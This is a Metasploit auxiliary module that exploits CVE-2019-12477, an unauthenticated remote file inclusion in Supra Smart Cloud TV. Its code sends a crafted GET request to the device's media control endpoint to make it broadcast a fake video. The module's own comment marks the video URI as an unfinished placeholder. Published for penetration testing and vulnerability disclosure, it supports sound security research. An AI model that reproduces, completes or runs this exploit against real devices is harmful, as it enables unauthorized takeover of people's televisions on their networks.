##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Supra Smart Cloud TV Remote File Inclusion',
      'Description'    => %q{
        This module exploits an unauthenticated remote file inclusion which
        exists in Supra Smart Cloud TV. The media control for the device doesn't
        have any session management or authentication. Leveraging this, an
        attacker on the local network can send a crafted request to broadcast a
        fake video.
      },
      'Author'         => [
        'Dhiraj Mishra' # Discovery, PoC, and module
      ],
      'References'     => [
        ['CVE', '2019-12477'],
        ['URL', 'https://www.inputzero.io/2019/06/hacking-smart-tv.html']
      ],
      'DisclosureDate' => '2019-06-03',
      'License'        => MSF_LICENSE
    ))
  end

  def run
    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => '/remote/media_control',
      'vars_get' => {
        'action' => 'setUri',
        'uri'    => '' # TODO: Make this work
      }
    )

    unless res && res.code == 200
      print_error('No fake video was broadcasted')
      return
    end

    print_good('Fake video was broadcasted')
  end
end
